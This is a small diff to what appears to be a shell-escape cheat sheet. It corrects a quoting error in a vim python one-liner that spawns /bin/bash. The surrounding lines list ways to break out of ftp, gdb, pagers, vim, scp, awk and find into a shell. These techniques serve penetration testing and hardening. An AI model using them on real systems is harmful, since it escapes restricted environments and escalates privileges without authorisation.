@@ -57,7 +57,7 @@ ftp > !/bin/sh or !/bin/bash
 gdb > !/bin/sh or !/bin/bash
 more/man/less > !/bin/sh or !/bin/bash
 vim > !/bin/sh or !/bin/bash
-vim > :python import os; os.system("/bin/bash )
+vim > :python import os; os.system("/bin/bash")
 scp > scp -S /path/yourscript x y:
 awk > awk 'BEGIN {system("/bin/sh or /bin/bash")}'
 find > find / -name test -exec /bin/sh or /bin/bash \;
